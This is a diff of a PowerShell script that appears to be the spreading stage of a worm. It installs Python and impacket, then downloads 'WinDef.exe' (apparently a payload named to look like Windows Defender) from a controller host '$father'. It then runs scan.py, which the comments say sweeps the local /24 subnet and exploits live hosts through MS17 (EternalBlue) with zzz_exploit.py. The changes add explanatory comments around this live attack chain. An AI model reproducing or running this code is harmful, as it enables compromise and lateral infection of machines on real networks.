@@ -23,6 +23,7 @@ function get_wget {
 
 function download_file_and_install($url,$name,$wgetBinLocation){
 
+# Dont ask why a loop LOL
 1..1 | % {
 # Downlaod
 $filename = "$_" + $name
@@ -33,16 +34,25 @@ Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\pyth
         }
 }
 
+
+
+
+# First Downlaod wget
 $wgetBinLocation = get_wget
+
+
+# Download and install python
 #download_file_and_install "https://www.python.org/ftp/python/2.7/python-2.7.msi" "p.msi" $wgetBinLocation
 #https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
 download_file_and_install "https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi" "p.msi" $wgetBinLocation
 
-# Get pip to download and install impacket
-# Download get-pip
+
+
+# Download pip and install it to download and install impacket
 $Location = '' + $save_dir + '\' + 'get-pip.py';
 Start-Process -FilePath $wgetBinLocation -Args " https://bootstrap.pypa.io/get-pip.py -O $Location" -passthru -NoNewWindow -Wait
 
+# Install impacket
 python $Location
 python -m pip  install impacket
 
@@ -51,12 +61,15 @@ python -m pip  install impacket
 $Location = '' + $save_dir + '\' + 'WinDef.exe';
 Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
 
-# Get all valid IPs
-python getIPs.py
-# Scan and Exploit
+# Get all valid IPs (The IPs in /24)
+# For example: If the target has 192.168.1.1 it will get all 192.168.1.0/24 IPs
+# Then ping them if an IP is alive, it will be checked for MS17 then Exploit
 python scan.py
+# NOTE: ^WinDef.exe <- Nemo.exe should be in the same dir as scan.py and zzz_exploit.py
 
 
+
+##### Ignore this:
 #$filename = "wget.exe"
 #$Location = '' + $save_dir + '\' + $filename;
 #Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden
